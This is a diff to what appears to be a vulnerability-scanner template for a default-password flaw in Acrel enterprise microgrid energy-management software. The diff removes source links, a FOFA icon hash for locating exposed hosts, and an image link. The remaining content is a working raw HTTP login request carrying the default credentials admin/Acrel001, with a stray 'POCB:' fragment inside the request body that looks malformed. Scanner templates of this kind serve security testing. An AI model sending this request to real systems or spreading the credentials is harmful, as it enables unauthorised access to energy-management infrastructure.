@@ -3,12 +3,8 @@ info:
   name: 安科瑞企业微电网能效管理login存在默认密码泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gf0slxk86sew5bpr'
+  description: ''
   tags: info-leak,default-login,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gf0slxk86sew5bpr
-    fofa: icon_hash="-1291691164"
 http:
 - raw:
   - 'POST /SubstationWEBV2/user/login HTTP/1.1
@@ -38,7 +34,6 @@ http:
 
     fLoginname=admin&fPassword=Acrel001&loginType=password&projectType=4
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771858775339-bdeaef8d-46bb-4279-8f8e-7b6314ec3b80.png)
 
     POCB:'
   redirects: false
